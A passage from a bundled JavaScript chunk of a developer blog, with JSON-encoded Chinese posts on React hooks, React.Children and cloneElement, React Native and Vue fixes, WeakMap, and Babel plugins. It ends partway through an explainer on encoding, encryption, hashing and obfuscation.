useContext</code></p>","slug":"React-v16.7-Hooks(1)","sha":"fc32341fa1074291a622a829343b7b8a33955b7c"}')},566:function(n){n.exports=JSON.parse('{"content":"<p><code>useCallback, useMemo, useRef, useImperativeMethods, useMutationEffect, useLayoutEffect</code></p>\\n<hr>\\n<ul>\\n<li><p>useCallback</p>\\n</li>\\n<li><p>useMemo</p>\\n</li>\\n</ul>\\n<p><code>useCallback(fn, inputs) is equivalent to useMemo(() =&gt; fn, inputs)</code></p>\\n<p>根据inputs的内容判断是否执行缓存。</p>\\n<p>待更新：</p>\\n<p>与<code>shouldComponentUpdate</code>搭配</p>\\n<ul>\\n<li>useRef</li>\\n</ul>\\n<ol>\\n<li><p>可以当成class中的ref属性使用，与<code>React.createRef()</code>类似，引用值放在<code>.current</code>属性下。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">TextInputWithFocusButton</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n   <span class=\\"hljs-keyword\\">const</span> inputEl = useRef(<span class=\\"hljs-literal\\">null</span>);\\n   <span class=\\"hljs-keyword\\">const</span> onButtonClick = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-comment\\">// `current` points to the mounted text input element</span>\\n     inputEl.current.focus();\\n   };\\n   <span class=\\"hljs-keyword\\">return</span> (\\n     &lt;&gt;\\n       &lt;input ref={inputEl} type=\\"text\\" /&gt;\\n       &lt;button onClick={onButtonClick}&gt;Focus the input&lt;/button&gt;\\n     &lt;/&gt;\\n   );\\n }</code></pre></code></pre>\\n</li>\\n<li><p>可以当成<code>instance fields in class</code>使用，类似于<code>this.xxx</code>，保留任何变量。</p>\\n</li>\\n</ol>\\n<ul>\\n<li>useImperativeMethods</li>\\n</ul>\\n<p>自定义并且暴露一个<code>ref</code>实例的方法到父元素，一般搭配<code>forwardRef</code>使用。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">FancyInput</span>(<span class=\\"hljs-params\\">props, ref</span>) </span>{\\n  <span class=\\"hljs-keyword\\">const</span> inputRef = useRef();\\n  useImperativeMethods(ref, () =&gt; ({\\n    <span class=\\"hljs-attr\\">focus</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n      inputRef.current.focus();\\n    }\\n  }));\\n  <span class=\\"hljs-keyword\\">return</span> &lt;input ref={inputRef} ... /&gt;;\\n}\\nFancyInput = forwardRef(FancyInput);</code></pre></code></pre>\\n<p>当父元素这么调用<code>&lt;FancyInput ref={fancyInputRef} /&gt;</code>，<code>fancyInputRef.current</code>就存在<code>focus</code>方法。</p>\\n<ul>\\n<li>useMutationEffect</li>\\n</ul>\\n<p>相当于<code>useEffect</code>在React执行DOM更新的时候同步调用。</p>\\n<ul>\\n<li>useLayoutEffect</li>\\n</ul>\\n<p>相当于<code>useEffect</code>在React执行DOM更新结束的时候同步调用。</p>\\n<p>有点像<code>componentDidUpdate</code></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-31","timeArr":[2018,9,31,0,0,0,0],"title":"React v16.7 Hooks(2)","uuid":"98dd615567b3aca2beb98ad1d65b71331760149b","summary":"<p><code>useCallback, useMemo, useRef, useImperativeMethods, useMutationEffect, useLayoutEffect</code></p>","slug":"React-v16.7-Hooks(2)","sha":"4f37e4ca6137a17d6454b46239f1712d981ecdc7"}')},567:function(n){n.exports=JSON.parse('{"content":"<p>useReducer</p>\\n<p>模拟reducer</p>\\n<p><code>const [state, dispatch] = useReducer(reducer, initialState, initialAction);</code></p>\\n<ul>\\n<li>参数1<code>reducer</code> </li>\\n</ul>\\n<p>与<code>redux</code>写法相比，不需要默认返回值</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state, action</span>) </span>{\\n  <span class=\\"hljs-keyword\\">switch</span> (action.type) {\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'reset\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> initialState;\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'increment\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">count</span>: state.count + <span class=\\"hljs-number\\">1</span>};\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'decrement\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">count</span>: state.count - <span class=\\"hljs-number\\">1</span>};\\n  }\\n}</code></pre></code></pre>\\n<ul>\\n<li>参数2 <code>initialState</code></li>\\n</ul>\\n<p>默认渲染后的初始值，有点类似<code>componentDidMount</code>，第一次执行的时候触发</p>\\n<ul>\\n<li>参数3 <code>initialAction</code></li>\\n</ul>\\n<p>当执行触发后，会立刻执行这个action。</p>\\n<p>官网例子：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> { render } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\\"react-dom\\"</span>;\\n<span class=\\"hljs-keyword\\">import</span> React, { Component, useState,useReducer } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\\"react\\"</span>;\\n\\n<span class=\\"hljs-keyword\\">const</span> initialState = { <span class=\\"hljs-attr\\">count</span>: <span class=\\"hljs-number\\">0</span> };\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state, action</span>) </span>{\\n  <span class=\\"hljs-keyword\\">switch</span> (action.type) {\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'reset\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> { <span class=\\"hljs-attr\\">count</span>: action.payload };\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'increment\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> { <span class=\\"hljs-attr\\">count</span>: state.count + <span class=\\"hljs-number\\">1</span> };\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'decrement\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> { <span class=\\"hljs-attr\\">count</span>: state.count - <span class=\\"hljs-number\\">1</span> };\\n  }\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">Counter</span>(<span class=\\"hljs-params\\">{ initialCount }</span>) </span>{\\n  <span class=\\"hljs-keyword\\">const</span> [state, dispatch] = useReducer(\\n    reducer,\\n    initialState,\\n    { <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'reset\'</span>, <span class=\\"hljs-attr\\">payload</span>: initialCount },\\n  );\\n  <span class=\\"hljs-keyword\\">return</span> (\\n    &lt;React.Fragment&gt;\\n      Count: {state.count}\\n      &lt;button\\n        onClick={() =&gt; dispatch({ type: \'reset\', payload: initialCount||initialState.count })}&gt;\\n        Reset\\n      &lt;/button&gt;\\n      &lt;button onClick={() =&gt; dispatch({ type: \'increment\' })}&gt;+&lt;/button&gt;\\n      &lt;button onClick={() =&gt; dispatch({ type: \'decrement\' })}&gt;-&lt;/button&gt;\\n    &lt;/React.Fragment&gt;\\n  );\\n}\\nrender(&lt;Counter initialCount={5} /&gt;, <span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"root\\"</span>));</code></pre></code></pre>\\n<ol>\\n<li>这里<code>Counter</code>接受一个<code>initialCount</code>的prop，此处设定为5。</li>\\n<li>这里第2个参数<code>initialState</code>设置为<code>{ count: 0 }</code>，说明初始加载后，显示为0。</li>\\n<li>这里第3个参数<code>initialAction</code>是<code>{ type: &#39;reset&#39;, payload: initialCount }</code>，说明当组件加载完毕，会立刻执行这个action，也就是执行<code>reset</code>，然后显示会变为5。</li>\\n<li>因此组件加载，显示5。</li>\\n</ol>\\n<p><a href=\\"https://codesandbox.io/s/48pn6o407\\">以上代码在线</a></p>\\n<blockquote>\\n<p>可以搭配<code>useContext</code>来传递到深层子组件(传递<code>dispatch</code>)。</p>\\n</blockquote>\\n<p><a href=\\"https://reactjs.org/docs/hooks-faq.html#how-to-avoid-passing-callbacks-down\\">官网例子:https://reactjs.org/docs/hooks-faq.html#how-to-avoid-passing-callbacks-down</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-08","timeArr":[2018,10,8,0,0,0,0],"title":"React v16.7 Hooks(3)","uuid":"fc7c450a8aab31c939be77ef556ba927f8da6619","summary":"<p>useReducer</p>\\n<p>模拟reducer</p>\\n<p><code>const [state, dispatch] = useReducer(reducer, initialState, initialAction);</code></p>\\n<ul>\\n<li>参数1<code>reducer</code></li>\\n</ul>\\n<p>与<code>redux</code>写法相比，不需要默认返回值</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">red</span>...</span></code></pre>","slug":"React-v16.7-Hooks(3)","sha":"012abf1ae3a9d2bef888109e1147dae1407eda09"}')},568:function(n){n.exports=JSON.parse('{"content":"<p><code>React.Children</code>和<code>this.props.children</code>都是获取父组件的子元素(子组件)</p>\\n<p>this.props.children:</p>\\n<ol>\\n<li>1个子元素  =&gt; {Object}(React元素(组件)对象)</li>\\n<li>多个子元素 =&gt; [{Object},{Object}...]</li>\\n<li>无子元素   =&gt; undefined</li>\\n<li>text元素   =&gt; text(字符串)</li>\\n<li>注释       =&gt; undefined</li>\\n</ol>\\n<p>11-21补充：</p>\\n<p><code>this.props.children</code>很重要的一点是，当组件更新时，并不会重复渲染。</p>\\n<p>搭配<code>React.createContext</code>能达到只渲染<code>context</code>改变的组件，类似<code>react-redux</code>的效果。</p>\\n<p>参考自：<a href=\\"https://zhuanlan.zhihu.com/p/50336226\\">避免React Context导致的重复渲染</a></p>\\n<p>React.Children:</p>\\n<p>一个方法集合</p>\\n<p>包含<code>map,forEach,count,toArray,only</code></p>\\n<ul>\\n<li><p><code>count(children)</code>:计算子组件数量(无就为0)</p>\\n</li>\\n<li><p><code>only(children)</code>:children必须是唯一一个React元素对象(不可以是text)</p>\\n</li>\\n</ul>\\n<p>其他和ES6一样了</p>\\n<p>其中<code>map</code>和<code>forEach</code>第一个参数都是children，第二个参数就是自定义函数<code>(child,index)=&gt;{}</code></p>\\n<p>无论几个子元素，使用上面的<code>map</code>和<code>toArray</code>都会返回一个数组，包含着{Object}</p>\\n<p>这样来进行处理就不需要再去判断，方便安全</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-10","timeArr":[2018,5,10,0,0,0,0],"title":"React.Children","uuid":"07cc2d304f96574c9995198fe6ff05e9fc342322","summary":"<p><code>React.Children</code>和<code>this.props.children</code>都是获取父组件的子元素(子组件)</p>\\n<p>this.props.children:</p>\\n<ol>\\n<li>1个子元素  =&gt; {Object}(React元素(组件)对象)</li>\\n<li>多个子元素 =&gt; [{Object},{Object}...]</li>\\n<li>无子元素   =...</li>\\n</ol>","slug":"React.Children","sha":"30a4f1281825a6b1c904adf8abddc4b886ccbd1a"}')},569:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>React.cloneElement(\\n  element,\\n  [props],\\n  [...children]\\n)</code></pre></code></pre>\\n<h2 id=\\"di-yi-ge-can-shu-element\\">第一个参数：element</h2>\\n<p>必须是一个存在的React组件或者原生DOM，以下都可以</p>\\n<p><code>React.cloneElement(&lt;div /&gt;)</code>\\n<code>React.cloneElement(&lt;Child /&gt;)</code></p>\\n<p>但我们通常发现用的最多的是搭配React.Children.map和this.props.children使用，如下：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>React.Children.map(<span class=\\"hljs-keyword\\">this</span>.props.children,child=&gt;{\\n    React.cloneElement(child,{...props},children)\\n})</code></pre></code></pre>\\n<p>首先不能直接和this.props.children使用，一旦子元素数量大于1，type为undefined的React对象</p>\\n<pre><code><pre class=\\"hljs\\"><code>// 子元素数量大于1,返回空\\nrender(){\\n    return React.cloneElement(this.props.children,...)\\n}</code></pre></code></pre><p>其次，这个方法的作用是为了给子组件进行自定义属性配置，这用到了第二个和第三个参数</p>\\n<h2 id=\\"di-er-ge-can-shu-props\\">第二个参数：props</h2>\\n<p>配置当前element的props</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 我们的意图是希望每个child组件都继承父组件props</span>\\nReact.Children.map(<span class=\\"hljs-keyword\\">this</span>.props.children,child=&gt;{\\n    React.cloneElement(child,<span class=\\"hljs-keyword\\">this</span>.props)\\n})</code></pre></code></pre>\\n<p>但上面的写法一旦遇到嵌套组件，则会触发<code>maximum call stack size is exceeded</code>，因为\\n<code>this.props</code>包含了<code>children</code>属性，因此将一直迭代执行.</p>\\n<p>这么写能安全的继承父组件props</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> {children,...otherPorps}=<span class=\\"hljs-keyword\\">this</span>.porps\\nReact.Children.map(children,child=&gt;{\\n    React.cloneElement(child,otherPorps)\\n})</code></pre></code></pre>\\n<p>当然，props参数还可以自行配置新的属性，最终都能分别传递给每一个子组件</p>\\n<h2 id=\\"di-san-ge-can-shu-children\\">第三个参数：children</h2>\\n<p>配置当前element的children，用的频率比起第二个参数相对较少</p>\\n<p>和第二个参数一样，这里也不能使用this.props.children，否则也将进入死循环</p>\\n","toc":[{"anchor":"di-yi-ge-can-shu-element","level":2,"text":"第一个参数：element"},{"anchor":"di-er-ge-can-shu-props","level":2,"text":"第二个参数：props"},{"anchor":"di-san-ge-can-shu-children","level":2,"text":"第三个参数：children"}],"relatedTags":null,"created_at":"2018-06-11","timeArr":[2018,5,11,0,0,0,0],"title":"React.cloneElement","uuid":"9fc02f51e144eb4dc14889a72398e5a21ee05145","summary":"<pre class=\\"hljs\\"><code>React.cloneElement(\\n  element,\\n  [props],\\n  [...children]\\n)\\n</code></pre>\\n<h4>第一个参数：element</h4>\\n<p>必须是一个存在的React组件或者原生DOM，以下都可以</p>\\n<p><code>React.cloneElement(&lt;div /&gt;)</code>\\n`React.clon...</p>","slug":"React.cloneElement","sha":"f758381282764ccf2eeb5e222145b6ab40de7d78"}')},570:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"react-native-yun-xing-an-zhuo-bao-chu-duplicate-class-wen-ti\\">React Native运行安卓报出Duplicate Class问题</h3>\\n<p>报错现象：</p>\\n<p>启动安卓开发中，出现大量Duplicate Class错误提示</p>\\n<p><img src=\\"/article/img/duplicate-class.png\\" alt=\\"\\"></p>\\n<p>在<code>app/build.gradle</code>中添加</p>\\n<pre><code><pre class=\\"hljs\\"><code>configurations {\\n    all*.exclude module:\'bcprov-jdk15on\'\\n}</code></pre></code></pre>","toc":[{"anchor":"react-native-yun-xing-an-zhuo-bao-chu-duplicate-class-wen-ti","level":3,"text":"React Native运行安卓报出Duplicate Class问题"}],"relatedTags":null,"created_at":"2022-09-29","timeArr":[2022,8,29,0,0,0,0],"title":"ReactNative安卓打包错误：Duplicate Class问题","uuid":"7d1e02ecc096a476ad4ed88e3354920a21e40f15","summary":"<h4>React Native运行安卓报出Duplicate Class问题</h4>\\n<p>报错现象：</p>\\n<p>启动安卓开发中，出现大量Duplicate Class错误提示</p>\\n<p><img src=\\"/article/img/duplicate-class.png\\" alt=\\"\\"></p>\\n<p>在<code>app/build.gradle</code>中添加</p>\\n<pre class=\\"hljs\\"><code>configurati...</code></pre>","slug":"ReactNative-an-zhuo-da-bao-cuo-wu-：Duplicate-Class-wen-ti","sha":"af9902397a4428fa893968c40dab1a5c1da7e809"}')},571:function(n){n.exports=JSON.parse('{"content":"<p>因为在react-native中，所有安卓都直接返回<code>&lt;View /&gt;</code></p>\\n<p><a href=\\"https://github.com/facebook/react-native/blob/277a64f03ec2a5a5c833f15263b3c3fa45577cae/Libraries/Components/SafeAreaView/SafeAreaView.js#L29-L34\\">https://github.com/facebook/react-native/blob/277a64f03ec2a5a5c833f15263b3c3fa45577cae/Libraries/Components/SafeAreaView/SafeAreaView.js#L29-L34</a></p>\\n<pre><code><pre class=\\"hljs\\"><code>if (Platform.OS === \'android\') {\\n  exported = View;\\n} else {\\n  exported = require(\'./RCTSafeAreaViewNativeComponent\').default;\\n}\\n</code></pre></code></pre><p>使用<code>react-native-safe-area-context</code>解决问题</p>\\n","toc":[],"relatedTags":null,"created_at":"2022-09-28","timeArr":[2022,8,28,0,0,0,0],"title":"SafeAreaView在华为机型不起作用","uuid":"50bd8f6626234c3d9241976661b6a78d10859163","summary":"<p>因为在react-native中，所有安卓都直接返回<code>&lt;View /&gt;</code></p>\\n<p>[https://github.com/facebook/react-native/blob/277a64f03ec2a5a5c833f15263b3c3fa45577cae/Libraries/Components/SafeAreaView/...</p>","slug":"SafeAreaView-zai-hua-wei-ji-xing-bu-qi-zuo-yong","sha":"f5189448419dd4c2ab51e65d3a040d41675899ac"}')},572:function(n){n.exports=JSON.parse('{"content":"<p>最开始我认为可以用<code>v-bind=&quot;$attrs&quot;</code>来覆盖<code>v-on:key=&quot;value&quot;</code>的绑定，以至于在使用<code>vuetify</code>创建自定义组件时通过<code>$attrs</code>来覆盖props属性，</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-vue\\"><pre class=\\"hljs\\"><code>&lt;template&gt;\\n    &lt;!-- 本意是通过$attrs传递的color来覆盖掉默认的color --&gt;\\n    &lt;v-btn color=&quot;info&quot; v-bint=&quot;$attrs&quot;&gt;\\n        &lt;slot&gt;&lt;/slot&gt;\\n    &lt;/v-btn&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\n    export default {\\n        name: \'CustomButton\'\\n    }\\n&lt;/script&gt;</code></pre></code></pre>\\n<p>这个案例确实有效， 但其实<code>v-bind=$attrs</code>并不能覆盖掉props的绑定，参考一下例子：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>&lt;input placeholder=<span class=\\"hljs-string\\">\\"a\\"</span> v-bind=<span class=\\"hljs-string\\">\\"{placeholder : \'b\'}\\"</span> /&gt;\\n&lt;input v-bind=\\"{placeholder : \'b\'}\\" placeholder=\\"a\\" /&gt;</code></pre></code></pre>\\n<p>在上面这个例子中，不管你的<code>v-bind</code>放在前还是后，最后placeholder渲染出来都是&quot;a&quot;。</p>\\n<p>那么问题来了，在<code>vuetify</code>中为什么可以使用<code>$attrs</code>进行覆盖？</p>\\n<p>原来在vuetify内部，有一个watch，对于传入的$attrs， 会首先绑定到<code>vm.$data.attrs$</code>，这个<code>attrs$</code>是自定义一个空对象，作用就是为了跟踪<code>$attrs</code></p>\\n<p>在渲染组件时，其实将$attrs全部转换为了props在传递入子组件</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> data={\\n    <span class=\\"hljs-comment\\">// 一些自定义props</span>\\n    ...this.data.attrs$,\\n}\\n<span class=\\"hljs-keyword\\">return</span> h(<span class=\\"hljs-keyword\\">this</span>.tag, data, newChildren)</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2021-10-03","timeArr":[2021,9,3,0,0,0,0],"title":"Vue中props绑定和$attrs绑定的优先等级","uuid":"6798b7d7e1d0be3c2f8889f3f527875e351b867c","summary":"<p>最开始我认为可以用<code>v-bind=&quot;$attrs&quot;</code>来覆盖<code>v-on:key=&quot;value&quot;</code>的绑定，以至于在使用<code>vuetify</code>创建自定义组件时通过<code>$attrs</code>来覆盖props属性，</p>\\n<p>例如：</p>\\n<pre class=\\"hljs\\"><code>&lt;template&gt;\\n    &lt;!-- 本意是通过$attrs传递的color来覆盖掉默认的color...</code></pre>","slug":"Vue-zhong-props-bang-ding-he-$attrs-bang-ding-de-you-xian-deng-ji","sha":"e7813bbaeb1fb13c70ce1da35fb282ec842889d2"}')},573:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"weakmap\\">WeakMap</h4>\\n<ul>\\n<li><p>键是弱引用</p>\\n<p>  如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象是否还在该弱引用的结构中</p>\\n</li>\\n</ul>\\n<p>因此，键一旦丢失，再也无法获取内容</p>\\n<ol>\\n<li>必须使用对象作为键，当对象引用消失，自动清除</li>\\n<li>必须通过键去获取内容</li>\\n</ol>\\n<p>只要保管好 key ，它就是真正的私有属性</p>\\n<ul>\\n<li>WeakMap和Symbol</li>\\n</ul>\\n<p>Symbol可以通过 <code>getOwnPropertySymboly</code>去获取所有Symbol</p>\\n<pre><code><pre class=\\"hljs\\"><code>const object1 = {};\\nconst a = Symbol(\'a\');\\n\\nobject1[a] = \'localSymbol\';\\n\\nconst objectSymbols = Object.getOwnPropertySymbols(object1);\\n\\nconsole.log(object1[objectSymbols[0]]);</code></pre></code></pre>","toc":[{"anchor":"weakmap","level":4,"text":"WeakMap"}],"relatedTags":null,"created_at":"2018-11-17","timeArr":[2018,10,17,0,0,0,0],"title":"WeakMap理解笔记","uuid":"f559d47fb4cf8cfa9bfb2bd0d9bba58e079f66ec","summary":"<h4>WeakMap</h4>\\n<ul>\\n<li>\\n<p>键是弱引用</p>\\n<p>如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象是否还在该弱引用的结构中</p>\\n</li>\\n</ul>\\n<p>因此，键一旦丢失，再也无法获取内容</p>\\n<ol>\\n<li>必须使用对象作为键，当对象引用消失，自动清除</li>\\n<li>必须通过键去获取内容</li>\\n</ol>\\n<p>只要保管好 key ，它就是...</p>","slug":"WeakMap-li-jie-bi-ji","sha":"200fdba2077d822ff14086c8249fb87383fb32dc"}')},574:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"bable-cha-jian-bian-xie-yi-xie-zong-jie\\">BABLE插件编写一些总结</h2>\\n<ol>\\n<li><p>babel-plugin总是先于babel-presets执行，但实际上它们是并行执行，因此如果需要编写一个有依赖的babel插件，其实就是\\n race模式。<a href=\\"https://jamie.build/babel-plugin-ordering.html\\">https://jamie.build/babel-plugin-ordering.html</a></p>\\n<p> 这么做是为了节省编译时间，有一个选项，<code>passPerPreset</code>可以单线程执行编译，但是这会影响性能，因此后续可能废弃。</p>\\n<p> 比较好的方法是，如果需要最先获取源代码AST，</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> visitor:{\\n  <span class=\\"hljs-attr\\">Program</span>:{\\n    <span class=\\"hljs-string\\">\\"enter\\"</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">path</span>)</span>{   \\n      path.traverse({\\n        <span class=\\"hljs-comment\\">//...</span>\\n      })\\n    }\\n  }\\n }\\n</code></pre></code></pre>\\n</li>\\n<li><p>对于<code>t.XXXXX()</code>，括号内部只需要填写需要的属性即可</p>\\n</li>\\n<li><p>在<code>AST</code>树中要获取某个变量或者参数的引用，非常困难，因为有各种情况，包括</p>\\n<ul>\\n<li><p>定义变量</p>\\n</li>\\n<li><p>参数赋值</p>\\n</li>\\n<li><p>import</p>\\n</li>\\n<li><p>属性获取</p>\\n</li>\\n<li><p>for循环的index\\n...</p>\\n<p>上述所有情况还能互相叠加，要将所有都覆盖，是很大的工程，因此尽量只对字面去修改，不要追溯。</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>如果项目动态编译的情况很多，那么AST静态编译效果可能不太好。</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"bable-cha-jian-bian-xie-yi-xie-zong-jie","level":2,"text":"BABLE插件编写一些总结"}],"relatedTags":null,"created_at":"2018-09-24","timeArr":[2018,8,24,0,0,0,0],"title":"babel插件的一些总结","uuid":"ca04d014d61ce50791c49363dae3a3d3ae3b1e54","summary":"<h4>BABLE插件编写一些总结</h4>\\n<ol>\\n<li>\\n<p>babel-plugin总是先于babel-presets执行，但实际上它们是并行执行，因此如果需要编写一个有依赖的babel插件，其实就是\\nrace模式。https://jamie.build/babel-plugin-ordering.html</p>\\n<p>这么做是为...</p>\\n</li>\\n</ol>","slug":"babel-cha-jian-de-yi-xie-zong-jie","sha":"35b77bbafb93c7b66d99747c168be81a28ee84aa"}')},575:function(n){n.exports=JSON.parse('{"content":"<p><a href=\\"https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/\\">原文阅读</a></p>\\n<p><img src=\\"/article/img/js_obfuscation.png\\" alt=\\"js_obfuscation\\"></p>\\n<p><a href=\\"#%E7%BC%96%E7%A0%81\\">编码</a></p>\\n<p><a href=\\"#%E5%8A%A0%E5%AF%86\\">加密</a></p>\\n<p><a href=\\"#%E6%95%A3%E5%88%97%E6%B3%95(%E5%93%88%E5%B8%8C)\\">散列法</a></p>\\n<p><a href=\\"#%E6%B7%B7%E6%B7%86\\">混淆</a></p>\\n<p>很多人都对编码，加密，哈希，混淆的不同点感到<a href=\\"http://www.google.com/search?sourceid=chrome&amp;ie=UTF-8&amp;q=what%27s+the+difference+between+encoding+and+encryption%3F\\">疑惑</a>，我们一个一个解释：</p>\\n<h3 id=\\"bian-ma\\">编码</h3>\\n<p> <img src=\\"/article/img/ascii-image.png\\" alt=\\"ascii\\"></p>\\n<p>编码的目的是将数据转换，使其能被各类不同的系统正确(安全)的解析。例如：email发送的是二进制数据，在web上查看特殊字符。\\n它的目的<em>不是</em>为了让数据更安全，而是能让数据被正确的解析。</p>\\n<p>编码通过一些公开可用的方案将数据转换成另一种格式，因此它是可逆的。对编码进行解码不需要密钥，仅仅需要生成这个编码的算法。</p>\\n<p>例子：<a href=\\"http://www.asciitable.com/\\">ASCII</a>, <a href=\\"https://danielmiessler.com/study/encoding/#unicode\\">UNICODE</a>, <a href=\\"http://www.eskimo.com/~bloo/indexdot/html/topics/urlencoding.htm\\">URL ENCODING</a>, <a href=\\"https://en.wikipedia.org/wiki/Base64\\">BASE64</a></p>\\n<p>加密</p>\\n<p><img src=\\"/article/img/ciphertext.png\\" alt=\\"ciphertext\\"></p>\\n<p>加密的目的是转换数据以使其对其他人保密，例如:通过互联网向某人发送一封只有他们才能阅读的秘密信件，或者安全地发送密码。\\n比起关注适用和易用性，加密的目的是确保除了预期接收者之外的任何人都不能解读数据。</p>\\n<p>加密将数据通过某种方式转换为另一种格式，使得只有特定的个人可以解密。 它通过私有密钥，结合数据内容和算法执行加密操作。\\n因此，对加密内容的解密需要密文，算法和密钥缺一不可。</p>\\n<p>例子：<a href=\\"http://www.aes.org/\\">AES</a>, <a href=\\"https://en.wikipedia.org/wiki/Blowfish_(cipher)\\">BLOWFISH</a>, <a href=\\"http://www.rsa.com/\\">RSA</a></p>\\n<h3 id=\\"san-lie-fa-ha-xi\\">散列法(哈希)</h3>\\n<p><img src=\\"/article/img/sha512.gif\\" alt=\\"sha512\\"></p>\\n<p>散列法的目的是确保完整性，也就是说，当数据内容发生变化时你可以知道它已被更改。\\n从技术上讲，散列对任意输入都会生成固定长度字符串，它符合以下特性：</p>\\n<ol>\\n<li>输入相同，输出一定相同</li>\\n<li>绝大部分不同的输入不应该产生相同的输出</li>\\n<li>输入到输出行为不可逆</li>\\n<li>对输入值的修改会导致输出产生巨大的改变</li>\\n</ol>\\n<p>散列法与认证结合使用，确保某个特定的消息未被修改。 它的实现通过对需要传送的消息进行散列处理，然后使用发送方的密钥对这个散列值加密。</p>\\n<p>当接收方收到消息时，他们可以使用发送方的公钥解密出散列值，然后自己对邮件进行散列处理，并将自己处理得出的散列值与发送方传来的的散列值进行比较。 如果能匹配则是一个未修改的消息。</p>\\n<p>例子：<a href=\\"https://en.wikipedia.org/wiki/SHA-3\\">SHA-3</a>, <a href=\\"https://en.wikipedia.org/wiki/MD5\\">MD5 (已经废弃)</a>, 等等。</p>\\n<h3 id=\\"hun-xiao\\">混淆</h3>\\n<p><img src=\\"/article/img/obfuscated-e1454498907454.png\\" alt=\\"obfuscated\\"></p>\\n<p>混淆的目的是使某些东西更难理解，通常是为了使攻击或复制更加困难。</p>\\n<p>一个常见的用途是混淆源代码，使得这个项目难以被逆向工程。</p>\\n<p>重要的一点，混淆并不是一个安全的保护措施(例如加密），而是一个干扰。\\n它与编码一样，通常可以通过使用对数据混淆的算法来逆转，或者通过一个耗时的人工处理。</p>\\n<p>关于混淆的另一个关键点，根据对要进行混淆的内容不同，混淆代码的程度是有限制的。\\n例如，如果你要对代码进行混淆，必须要保证混淆的结果仍然可以被计算机解析，否则程序将停止运行。</p>\\n<p>例子: <a href=\\"https://javascriptobfuscator.com/\\">JAVASCRIPT OBFUSCATOR</a>, <a href=\\"http://proguard.sourceforge.net/\\">PROGUARD</a></p>\\n<h3 